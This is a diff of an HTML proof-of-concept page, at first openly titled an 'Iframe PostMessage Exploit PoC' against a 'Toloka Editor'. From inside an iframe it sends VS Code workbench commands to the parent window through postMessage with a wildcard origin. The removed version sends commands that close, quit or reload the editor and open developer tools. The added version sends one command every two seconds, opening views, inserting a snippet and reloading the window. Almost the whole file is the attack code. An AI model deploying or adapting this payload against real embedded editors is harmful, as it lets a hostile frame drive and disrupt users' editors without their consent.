@@ -1,50 +1,41 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
   <meta charset="UTF-8">
-  <title>Iframe PostMessage Exploit PoC</title>
-  <style>
-    body {
-      font-family: sans-serif;
-      background: #111;
-      color: #0f0;
-      text-align: center;
-      margin-top: 50px;
-    }
-  </style>
+  <title>🔥 VSCode PostMessage Test</title>
 </head>
 <body>
-  <h1>⚡ PoC: Toloka Editor iframe Exploit</h1>
-  <p>يتم الآن إرسال مجموعة أوامر حساسة إلى النافذة الأم...</p>
-
+  <h1>🚀 Sending postMessages to parent window...</h1>
   <script>
     const commands = [
-      "workbench.action.reloadWindow",
-      "workbench.action.toggleDevTools",
-      "workbench.action.toggleFullScreen",
-      "workbench.action.closeWindow",
-      "workbench.action.quit",
-      "workbench.action.showCommands",
-      "workbench.action.toggleSidebarVisibility",
-      "workbench.action.toggleZenMode"
+      { vscodeMessage: { command: "workbench.view.explorer" } },
+      { vscodeMessage: { command: "workbench.view.debug" } },
+      {
+        vscodeMessage: {
+          command: "editor.action.insertSnippet",
+          args: { snippet: "🔥 Hello from Amer!" }
+        }
+      },
+      { vscodeMessage: { command: "workbench.action.toggleSidebarVisibility" } },
+      { vscodeMessage: { command: "workbench.action.togglePanel" } },
+      { vscodeMessage: { command: "workbench.action.reloadWindow" } }
     ];
 
-    // إرسال كل الأوامر بعد انتظار النافذة الأم
-    window.addEventListener("message", (event) => {
-      console.log("📩 رسالة واردة من النافذة الأم:", event.data);
-    });
-
-    setTimeout(() => {
-      for (const cmd of commands) {
-        window.parent.postMessage({
-          vscodeMessage: {
-            command: cmd,
-            arguments: []
-          }
-        }, "*");
-        console.log("🚀 إرسال الأمر:", cmd);
+    let index = 0;
+    function sendNext() {
+      if (index < commands.length) {
+        console.log("✅ Sending:", commands[index]);
+        window.parent.postMessage(commands[index], "*");
+        index++;
+        setTimeout(sendNext, 2000); // إرسال كل أمر بعد 2 ثواني
       }
-    }, 2000);
+    }
+
+    // بدأ الإرسال بعد التحميل
+    window.onload = () => {
+      console.log("🚀 Starting message dispatch...");
+      sendNext();
+    };
   </script>
 </body>
 </html>
